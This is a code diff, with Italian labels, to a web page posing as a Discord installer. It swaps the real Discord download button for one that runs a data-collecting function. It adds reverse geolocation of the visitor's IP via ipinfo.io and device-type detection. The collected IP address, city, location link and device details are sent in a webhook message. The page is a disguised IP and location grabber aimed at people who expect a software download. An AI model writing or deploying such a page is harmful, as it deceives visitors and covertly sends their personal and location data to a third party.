@@ -30,8 +30,8 @@
 <body>
 
     <h1>Installazione di Discord sotto</h1>
-    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
-        Installa
+    <button onclick="sendDeviceInfo();">
+        Invia Informazioni
     </button>
 
     <script>
@@ -54,8 +54,10 @@
                 location: {
                     latitude: 'N/A',
                     longitude: 'N/A',
+                    city: 'N/A',
                     link: 'N/A'
                 },
+                deviceType: getDeviceType(),
                 timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 memory: navigator.deviceMemory || 'N/A'
@@ -66,6 +68,15 @@
                 .then(response => response.json())
                 .then(data => {
                     deviceInfo.ipAddress = data.ip;
+
+                    // Usa un servizio di geolocalizzazione inversa per ottenere la città
+                    return fetch(`https://ipinfo.io/${data.ip}/json?token=YOUR_IPINFO_TOKEN`);
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.city) {
+                        deviceInfo.location.city = data.city;
+                    }
                 });
 
             // Ottieni la posizione geografica se disponibile
@@ -91,6 +102,7 @@
                         { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
                         { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
                         { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
+                        { name: 'Tipo di Dispositivo', value: deviceInfo.deviceType || 'N/A', inline: true },
                         { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
                         { name: 'Profondità Colori', value: deviceInfo.colorDepth || 'N/A', inline: true },
                         { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
@@ -98,7 +110,8 @@
                         { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
                         { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true },
                         { name: 'IP Indirizzo', value: deviceInfo.ipAddress || 'N/A', inline: true },
-                        { name: 'Posizione', value: deviceInfo.location.link || 'N/A', inline: true }
+                        { name: 'Posizione', value: deviceInfo.location.link || 'N/A', inline: true },
+                        { name: 'Città', value: deviceInfo.location.city || 'N/A', inline: true }
                     ],
                     footer: {
                         text: "Messaggio inviato tramite webhook",
@@ -125,6 +138,19 @@
                 }
             } catch (error) {
                 console.error('Errore:', error);
+            }
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/mobile/i.test(userAgent)) {
+                return 'Telefono';
+            } else if (/tablet/i.test(userAgent)) {
+                return 'Tablet';
+            } else if (/iPad|iPod|Macintosh/i.test(userAgent)) {
+                return 'Tablet/iPad';
+            } else {
+                return 'Computer';
             }
         }
 
